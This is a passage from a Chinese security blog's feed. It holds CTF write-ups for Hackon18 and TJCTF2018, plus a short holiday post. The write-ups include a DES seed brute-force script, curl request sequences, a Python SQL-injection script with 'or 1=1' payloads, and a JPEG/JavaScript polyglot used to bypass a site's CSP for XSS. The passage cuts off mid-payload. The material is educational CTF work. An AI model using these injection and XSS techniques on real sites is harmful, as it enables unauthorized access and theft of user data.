padding <span class="keyword">and</span> action==ENCRYPT:</span><br><span class="line">                        self.addPadding()</span><br><span class="line">                <span class="keyword">elif</span> len(self.text) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">raise</span> Exception(<span class="string">"Data size should be multiple of 8"</span>)</span><br><span class="line"></span><br><span class="line">                self.generatekeys()</span><br><span class="line">                text_blocks = nsplit(self.text, <span class="number">8</span>)</span><br><span class="line">                result = list()</span><br><span class="line">                <span class="keyword">for</span> block <span class="keyword">in</span> text_blocks:</span><br><span class="line">                        block = string_to_bit_array(block)</span><br><span class="line">                        block = self.permut(block,PI)</span><br><span class="line">                        g, d = nsplit(block, <span class="number">32</span>)</span><br><span class="line">                        tmp = <span class="keyword">None</span></span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                                d_e = self.expand(d, E)</span><br><span class="line">                                <span class="keyword">if</span> action == ENCRYPT:</span><br><span class="line">                                        tmp = self.xor(self.keys[i], d_e)</span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                        tmp = self.xor(self.keys[<span class="number">15</span>-i], d_e)</span><br><span class="line">                                tmp = self.substitute(tmp)</span><br><span class="line">                                tmp = self.permut(tmp, P)</span><br><span class="line">                                tmp = self.xor(g, tmp)</span><br><span class="line">                                g = d</span><br><span class="line">                                d = tmp</span><br><span class="line">                        result += self.permut(d+g, PI_1)</span><br><span class="line">                final_res = bit_array_to_string(result)</span><br><span class="line">                <span class="keyword">if</span> padding <span class="keyword">and</span> action==DECRYPT:</span><br><span class="line">                        <span class="keyword">return</span> self.removePadding(final_res)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> final_res</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">substitute</span><span class="params">(self, d_e)</span>:</span></span><br><span class="line">                subblocks = nsplit(d_e, <span class="number">6</span>)</span><br><span class="line">                result = list()</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(len(subblocks)):</span><br><span class="line">                        block = subblocks[i]</span><br><span class="line">                        row = int(str(block[<span class="number">0</span>])+str(block[<span class="number">5</span>]),<span class="number">2</span>)</span><br><span class="line">                        column = int(<span class="string">''</span>.join([str(x) <span class="keyword">for</span> x <span class="keyword">in</span> block[<span class="number">1</span>:][:<span class="number">-1</span>]]),<span class="number">2</span>)</span><br><span class="line">                        val = S_BOX[i][row][column]</span><br><span class="line">                        bin = binvalue(val, <span class="number">4</span>)</span><br><span class="line">                        result += [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> bin]</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">permut</span><span class="params">(self, block, table)</span>:</span></span><br><span class="line">                <span class="keyword">return</span> [block[x<span class="number">-1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> table]</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">expand</span><span class="params">(self, block, table)</span>:</span></span><br><span class="line">                <span class="keyword">return</span> [block[x<span class="number">-1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> table]</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(self, t1, t2)</span>:</span></span><br><span class="line">                <span class="keyword">return</span> [x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(t1,t2)]</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">generatekeys</span><span class="params">(self)</span>:</span></span><br><span class="line">                self.keys = []</span><br><span class="line">                key = string_to_bit_array(self.password)</span><br><span class="line">                key = self.permut(key, CP_1)</span><br><span class="line">                g, d = nsplit(key, <span class="number">28</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                        g, d = self.shift(g, d, SHIFT[i])</span><br><span class="line">                        tmp = g + d</span><br><span class="line">                        self.keys.append(self.permut(tmp, CP_2))</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(self, g, d, n)</span>:</span></span><br><span class="line">                <span class="keyword">return</span> g[n:] + g[:n], d[n:] + d[:n]</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">addPadding</span><span class="params">(self)</span>:</span></span><br><span class="line">                pad_len = <span class="number">8</span> - (len(self.text) % <span class="number">8</span>)</span><br><span class="line">                self.text += pad_len * chr(pad_len)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">removePadding</span><span class="params">(self, data)</span>:</span></span><br><span class="line">                pad_len = ord(data[<span class="number">-1</span>])</span><br><span class="line">                <span class="keyword">return</span> data[:-pad_len]</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, key, text, padding=False)</span>:</span></span><br><span class="line">                <span class="keyword">return</span> self.run(key, text, ENCRYPT, padding)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, key, text, padding=False)</span>:</span></span><br><span class="line">                <span class="keyword">return</span> self.run(key, text, DECRYPT, padding)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        IV = str(calendar.timegm(time.gmtime()))[-8:]</span></span><br><span class="line"><span class="string">        message= "######  redacted  ######"</span></span><br><span class="line"><span class="string">        d = des()</span></span><br><span class="line"><span class="string">        r = d.encrypt(IV,d.encrypt(IV,d.encrypt(IV,message)))</span></span><br><span class="line"><span class="string">        print ("Ciphered: %r" % r)</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        i = int(time.time()) % <span class="number">100000000</span>  <span class="comment"># 1534487873</span></span><br><span class="line">        d = des()</span><br><span class="line">        ct = <span class="string">'|\xb3Wm\x83\rE7h\xe3\xc0\xf1^Y\xf0\x8d\xa6I\x92\x9b\xa5\xbc\xdc\xca\x9d\xcd\xe9a0\xa3\x00\xf2\x13\x16]|\xae\xd8\x84\x88'</span></span><br><span class="line">        <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                IV = str(i).zfill(<span class="number">8</span>)</span><br><span class="line">                pt = d.decrypt(IV, d.decrypt(IV, d.decrypt(IV, ct)))</span><br><span class="line">                <span class="keyword">if</span> pt.find(<span class="string">'d4rk'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'found!'</span>, [IV, pt]</span><br><span class="line">                        exit()</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> i % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure><p>脚本爆破半天，得到答案<code>d4rk{0h_lol_t1m3_i5_n0t_A_g00d_s33d}c0de</code></p><p><img src="/2018/08/21/Hackon18-writeup/1534833823868.png" alt="1534833823868"></p><h4 id="Steg"><a href="#Steg" class="headerlink" title="Steg"></a>Steg</h4><h5 id="Steg-Twins"><a href="#Steg-Twins" class="headerlink" title="Steg_Twins"></a>Steg_Twins</h5><p><img src="/2018/08/21/Hackon18-writeup/1534822582055.png" alt="1534822582055"></p><p>经过比较，<code>file1</code>和<code>file2</code>两个文本文件的长度一样，再仔细观察，找出两个文本的相同的字符，拼接出来就是flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_text</span><span class="params">(filename)</span>:</span></span><br><span class="line">    S_text=<span class="string">''</span></span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">'r'</span>) <span class="keyword">as</span> line:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> line:</span><br><span class="line">            S_text+=i</span><br><span class="line">        <span class="keyword">return</span> S_text</span><br><span class="line"></span><br><span class="line">s1=operate_text(<span class="string">'file1'</span>)</span><br><span class="line">s2=operate_text(<span class="string">'file2'</span>)</span><br><span class="line"><span class="keyword">print</span> s1</span><br><span class="line"><span class="keyword">print</span> s2</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s1)):</span><br><span class="line">    <span class="keyword">if</span> s1[i]==s2[i]:</span><br><span class="line">        flag+=s1[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>运行得到结果</p><p><code>d4rk{lo0king_p4st_0ur_d1ff3renc3s}c0de</code></p><h5 id="Steg-Steg-It-Up"><a href="#Steg-Steg-It-Up" class="headerlink" title="Steg_Steg It Up"></a>Steg_Steg It Up</h5><p><img src="/2018/08/21/Hackon18-writeup/1534824835401.png" alt="1534824835401"></p><p>打开下载的图片</p><p><img src="/2018/08/21/Hackon18-writeup/1534824867690.png" alt="1534824867690"></p><p>神奇Stegsolve试水一波，发现一排的二维码</p><p><img src="/2018/08/21/Hackon18-writeup/1534824947150.png" alt="1534824947150"></p><p>一个一个扫扫咯</p><p>得到答案<code>d4rk{s000_m4ny_0f_7h3m_l0l_1_h4v33_t0_m4k333_th3_fl4g_l0ng_f0r_n0000_r3450n_1m40}c0de</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;人懒，懒得重新写writeup，写了一些觉得蛮不错的点，其中几题借鉴了下&lt;a href=&quot;http://yocchin.hatenablog.com/entry/2018/08/19/202100&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;大佬&lt;/a&gt;的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018的七夕节</title>
    <link href="https://jianghuxia.github.io/2018/08/17/2018%E7%9A%84%E4%B8%83%E5%A4%95%E8%8A%82/"/>
    <id>https://jianghuxia.github.io/2018/08/17/2018的七夕节/</id>
    <published>2018-08-17T13:18:31.000Z</published>
    <updated>2018-08-17T13:51:00.680Z</updated>
    
    <content type="html"><![CDATA[<p>马上大三了，还是单身狗。今天七夕，祝全天下有情人终成眷属啦。<img src="/2018/08/17/2018的七夕节/D0F06F0E3C04E7D71B1CE51C1B07592D.jpg" alt="D0F06F0E3C04E7D71B1CE51C1B07592D"><a id="more"></a> </p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=25706279&auto=1&height=66"></iframe><p>写了个程序员表白专用代码，别介意，拿去用吧（写下这句话，我内心毫无波动）<img src="/2018/08/17/2018的七夕节/20180817214051.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if not exists (<span class="keyword">select</span> * <span class="keyword">from</span> World <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'you'</span> ) </span><br><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> World <span class="keyword">where</span> someone <span class="keyword">like</span> <span class="string">'%you%'</span> ; </span><br><span class="line">else: </span><br><span class="line"><span class="keyword">Update</span> World <span class="keyword">set</span> someone = <span class="string">'you'</span> ; </span><br><span class="line"></span><br><span class="line">//你在的时候，你是全世界；你不在的时候，全世界是你。</span><br></pre></td></tr></table></figure><p>希望不久我也能像这样捏着她的脸 <img src="/2018/08/17/2018的七夕节/asdfjashdfjkadshfhsj.jpg" alt="asdfjashdfjkadshfhsj"></p><p>七夕快乐！晚安~~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;马上大三了，还是单身狗。今天七夕，祝全天下有情人终成眷属啦。&lt;img src=&quot;/2018/08/17/2018的七夕节/D0F06F0E3C04E7D71B1CE51C1B07592D.jpg&quot; alt=&quot;D0F06F0E3C04E7D71B1CE51C1B07592D&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="life" scheme="https://jianghuxia.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>TJCTF2018_wrtieup</title>
    <link href="https://jianghuxia.github.io/2018/08/13/tjctf2018/"/>
    <id>https://jianghuxia.github.io/2018/08/13/tjctf2018/</id>
    <published>2018-08-13T13:54:27.000Z</published>
    <updated>2018-10-23T10:13:48.368Z</updated>
    
    <content type="html"><![CDATA[<p>tjctf2018这场比赛挺不错的，很多新颖的题目，题目难度分层的很好，有难有易，下面是这次的writeup.</p><a id="more"></a> <h4 id="Web"><a href="#Web" class="headerlink" title="Web:"></a>Web:</h4><h5 id="Web-Bank"><a href="#Web-Bank" class="headerlink" title="Web_Bank"></a>Web_Bank</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_1.png" alt="img"></p><p>打开页面，查看源代码</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_2.png" alt="img"></p><h5 id="Web-Cookie-Monster"><a href="#Web-Cookie-Monster" class="headerlink" title="Web_Cookie Monster"></a>Web_Cookie Monster</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_3.png" alt="img"></p><p>打开页面，查看源代码，有个<code>/legs</code>，打开</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_4.png" alt="img"></p><p>继续右键查看源代码</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_5.png" alt="img"></p><h5 id="Web-Central-Savings-Account"><a href="#Web-Central-Savings-Account" class="headerlink" title="Web_Central Savings Account"></a>Web_Central Savings Account</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_6.png" alt="img"></p><p>打开网页，查看源代码。</p><p>接着打开<code>/static/main.js</code>，拉到底部，md5解码得到答案</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_7.png" alt="img"></p><h5 id="Web-Programmable-Hyperlinked-Pasta"><a href="#Web-Programmable-Hyperlinked-Pasta" class="headerlink" title="Web_Programmable Hyperlinked Pasta"></a>Web_Programmable Hyperlinked Pasta</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_7_1.png" alt="1534229658992"></p><p>打开网页</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_8.png" alt="img"></p><p>查看源代码，发现提示</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_9.png" alt="img"></p><p>然而并没啥卵用。。。</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_10.png" alt="img"></p><p>去看看下面那个链接</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_11.png" alt="img"></p><p>接着尝试改下get的url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://programmable_hyperlinked_pasta.tjctf.org/?lang=en.php</span><br><span class="line">https://programmable_hyperlinked_pasta.tjctf.org/?lang=ch.php</span><br></pre></td></tr></table></figure><p>都是空白页面</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_12.png" alt="img"></p><p>那就随便尝试，试试该路径，一波操作后，得到很多**消息。。。</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_13.png" alt="img"></p><p>查看下源代码</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_14.png" alt="img"></p><p>去网站根目录瞧瞧，嘿嘿</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_15.png" alt="img"></p><p>当然。。。。。这样也是可以的</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_16.png" alt="img"></p><h5 id="Web-Request-Me"><a href="#Web-Request-Me" class="headerlink" title="Web_Request Me"></a>Web_Request Me</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_17.png" alt="img"></p><p>打开网页</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_18.png" alt="img"></p><p>查看源代码</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_18_1.png" alt="img"></p><p>点点看咯，毕竟也没别的东西</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_19.png" alt="img"></p><p>随后你打开后，就会发现你做此题所需要了解的http请求方式+curl请求方式知识的链接：</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS</a></p><p>其实就是下面这张图里面的内容：</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_20.png" alt="img"></p><p>这里有个http请求方式相关链接：</p><p><a href="https://www.cnblogs.com/testcoffee/p/6295970.html" target="_blank" rel="noopener">https://www.cnblogs.com/testcoffee/p/6295970.html</a></p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_21.png" alt="img"></p><p>了解了这些，我们用curl试水下</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_22.png" alt="img"></p><p>题目url的请求方式都试了一遍，可以看到，POST和DELETE需要凭证</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_23.png" alt="img"></p><p>PUT显示了个更奇怪的东西</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_24.png" alt="img"></p><p>em~</p><p>凭证是什么鬼。。。后面继续试水，这里巨坑</p><p>原来所谓的凭证需要经过自己手工fuzz，一波踩坑，请求的data为：<code>username=admin\&amp;password=admin</code></p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_25.png" alt="img"></p><p>可以看到PUT有以下结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X PUT &quot;https://request_me.tjctf.org/&quot; --data username=admin\&amp;password=admin</span><br><span class="line">I stole your credentials!</span><br></pre></td></tr></table></figure><p>好的，告诉我们得到了凭证，那试试DELECT吧（这里试过get、post，但是没用）</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_26.png" alt="img"></p><p>最后谷歌一番，尝试</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_27.png" alt="img"></p><p>得到flag</p><p>这里还有个坑点：请求方式需要按照以下命令依次输入执行，并且DELETE这条命令需要输入两遍才能得到flag（尝试无数遍的操作）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST &quot;https://request_me.tjctf.org/&quot; --data username=admin\&amp;password=admin</span><br><span class="line">$ curl -X PUT &quot;https://request_me.tjctf.org/&quot; --data username=admin\&amp;password=admin</span><br><span class="line">$ curl -X DELETE &quot;https://request_me.tjctf.org/&quot; --data username=admin\&amp;password=admin -u admin:admin</span><br></pre></td></tr></table></figure><h5 id="Web-Moar-Horses"><a href="#Web-Moar-Horses" class="headerlink" title="Web_Moar Horses"></a>Web_Moar Horses</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_28.png" alt="img"></p><p>打开网页，看到这个，跟原来那题很想。。。打开开发者工具，会发现随着网页往下托，控制台会出现许多网页</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_29.png" alt="img"></p><p>咯，就是这样，往下滑不见底的那种</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_30.png" alt="img"></p><p>查看其中任意一个html的源码</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_31.png" alt="img"></p><p>猜测应该是大量html中含有一个带有flag的html文件。。。那怎么办呢。总不能一直拉着鼠标往下拖吧。。。。百度，谷歌了下，其实。。。控制台写个命令就行</p><p><code>window.setInterval(function(){window.scrollByLines(10000)},1)</code></p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_32.png" alt="img"></p><p>然后跑啊跑。。。。。。。1500多条才跑出来。。。</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_33.png" alt="img"></p><p>后面用ubuntu自带的火狐，跑了100多条请求就跑出来。。晕死。。这是为啥？</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_34.png" alt="img"></p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_35.png" alt="img"></p><h5 id="Web-Ess-Kyoo-Ell"><a href="#Web-Ess-Kyoo-Ell" class="headerlink" title="Web_Ess Kyoo Ell"></a>Web_Ess Kyoo Ell</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_36.png" alt="img"></p><p>打开网页</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_37.png" alt="img"></p><p>随意测试,用bp拦截下</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_38.png" alt="img"></p><p>再看看网页</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_38_1.png" alt="img"></p><p>提示<code>This is what I got about you from the database: no such column: password</code></p><p>再看看响应的源代码</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_39.png" alt="img"></p><p>尝试</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_40.png" alt="img"></p><p>这里有检验<code>@</code>，试试bp能不能绕过</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_41.png" alt="img"></p><p>提示还是：<code>This is what I got about you from the database: no such column: password</code></p><p>尝试改改post的数据<code>password</code>-&gt;<code>passwd</code></p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_42.png" alt="img"></p><p>提示：<code>This is what I got about you from the database: no such column: passwd</code></p><p>到这里大概知道我们可以干啥了。。通过修改这个字段，让服务器查询出我们想得到的信息</p><p>根据上面的分析，或许使用python的request请求更加合适呢！</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_43.png" alt="img"></p><p>这里简单的sql测试,就可以得到大致的信息，包括题目所求的用户admin的ip地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://ess-kyoo-ell.tjctf.org'</span></span><br><span class="line"></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line"></span><br><span class="line">    <span class="string">"email"</span>:<span class="string">"' or 1=1 #"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">#"username or 1=1 --":""</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"(username or 1=1) and username = 'admin' --"</span>:<span class="string">""</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=s.post(url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(r.text.split(<span class="string">'\n'</span>)[<span class="number">174</span>:<span class="number">174</span>+<span class="number">18</span>])     <span class="comment">#只查看174~174+18行的网页源代码</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>得到运行结果</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"profile-name"</span> <span class="attr">class</span>=<span class="string">"profile-name-card"</span>&gt;</span>This is what I got about you from the database: &#123;&amp;#39;id&amp;#39;: 706, &amp;#39;username&amp;#39;: &amp;#39;admin&amp;#39;, &amp;#39;first_name&amp;#39;: &amp;#39;Administrative&amp;#39;, &amp;#39;last_name&amp;#39;: &amp;#39;User&amp;#39;, &amp;#39;email&amp;#39;: &amp;#39;[email&amp;#160;protected]&amp;#39;, &amp;#39;gender&amp;#39;: &amp;#39;Female&amp;#39;, &amp;#39;ip_address&amp;#39;: &amp;#39;145.3.1.213&amp;#39;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>答案即是tjctf{145.3.1.213}</p><h5 id="Web-Stupid-blog"><a href="#Web-Stupid-blog" class="headerlink" title="Web_Stupid blog"></a>Web_Stupid blog</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_44.png" alt="img"></p><p>打开页面，有注册和登录，那就是注册再登录试试咯</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_45.png" alt="img"></p><p>注册了个账号，jianghuxia ,登录后发现自己的主页url是：<code>https://stupid_blog.tjctf.org/jianghuxia</code></p><p>推测每个username的页面是<code>https://stupid_blog.tjctf.org/&lt;username&gt;</code>，那么先尝试下<code>https://stupid_blog.tjctf.org/admin</code>，得到下图提示</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_46.png" alt="img"></p><p>仔细看看页面，发现有3个模块：<code>Report a User、Update Profile Picture (png, jpg)、Save</code></p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_47.png" alt="img"></p><p>感觉似曾相识em~~~流程大概是这么一个样，上传个人资料图片（JPEG / PNG），在个人“Posts”上设置帖子，最后提交给管理员，如果这样的话，考察的就是XSS咯</p><p>那么先测试一波上传，测试途中，发现了<a href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%D5%A5%A3%A1%BC%A5%EB%B2%E8%C1%FC" target="_blank" rel="noopener">配置文件图像</a>的固定URL是：<code>https://stupid_blog.tjctf.org/&lt;Username&gt;/pfp</code></p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_48.png" alt="img"></p><p>尝试过抓包冒充扩展名，但会发现因为是固定的路径，所以就算上传成功后，都是一张默认用户的图片，如果要进行其他的测试也是行不通的</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_49.png" alt="img"></p><p>尝试上传正常的图片，会发现正常显示，且访问路径<code>https://stupid_blog.tjctf.org/&lt;Username&gt;/pfp</code></p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_50.png" alt="img"></p><p>会跳转到刚刚的上传文件的下载</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_51.png" alt="img"></p><p>到此，大致能分析出后台具有挺严格的图片上传过滤规则，那么现在是能在图片数据域里做手脚了。。</p><p>再测试XSS的时候，几经测试，发现又具有严格的CSP规则。。。</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_52.png" alt="img"></p><p>em~~~那现在方向和思路都很明显了</p><p>通过XSS使用JPG或者png文件上传绕过CSP（Content-Security-Policy）</p><p>而关键的是，我们要把XSS的关键代码写入JPG中，绕过CSP</p><p>尝试了几波无果，没思路咯，网上搜了一番，嘿嘿，找到个跟这个好像的 ：</p><p><a href="https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs" target="_blank" rel="noopener">https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs</a></p><p>根据这篇文章分析，贼有意思，此文作者研究了JPG的文件格式，把脚本隐藏在了jpg图像中，orz…</p><p>首先，jpg文件格式的头部：</p><p>前4个字节是jpg文件头，随后2个字节，代表后面所填充的JPEG标头的长度</p><p><code>FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 48 00 00 00 00 00 00 00 00 00 00</code></p><p>接着，表示jpg数据域的开始的两个字节：<code>FF FE</code>，其后面紧跟两个代表数据域长度的字节</p><p>比如：<code>FF FE 00 1C 2A 2F 3D 61 6C 65 72 74 28 22 42 75 72 70 20 72 6F 63 6B 73 2E 22 29 3B 2F 2A</code></p><p><code>0xFF</code>，<code>0xFE</code>代表数据域开始，<code>0x00</code>，<code>0x1C</code>代表后面数据的长度加上这两个字节的本身长度。<code>0x001C</code>化为十进制代表28个字节，也就是56位</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_53.png" alt="img"></p><p>最后，JPG的文件尾部<code>2A 2F 2F 2F FF D9</code></p><p><code>0xFF、0xD9</code>代表JPG文件尾部的最后2个字节，意味着JPG文件的结束.</p><p>如此，当把代码<code>/=alert(&quot;Burp rocks.&quot;);/*</code>插入到一张jpg中，将是下面格式</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_54.png" alt="img"></p><p>接着回到题目先上传该文件，上传成功后，你可以访问<code>https://stupid_blog.tjctf.org/&lt;Username&gt;/pfp</code></p><p>下载这时的pfp文件，验证是否跟上传的一样</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_55.png" alt="img"></p><p>可以发现一模一样，意味着成功往JPG中写入了代码，再看看能不能执行</p><p>Post填入</p><p><code>&lt;script charset=&quot;ISO-8859-1&quot; src=&quot;/jianghuxia/pfp&quot;&gt;&lt;/script&gt;</code></p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_56.png" alt="img"></p><p>SAVE，就会弹出提示框</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_57.png" alt="img"></p><p>很好，我们成功了。那么接下来只需要简单改改上传图片中的代码，然后进行相同的操作，最后再进行一步“Report a User”就行。</p><p>现在需要写入的是：</p><p><code>*/=x=new 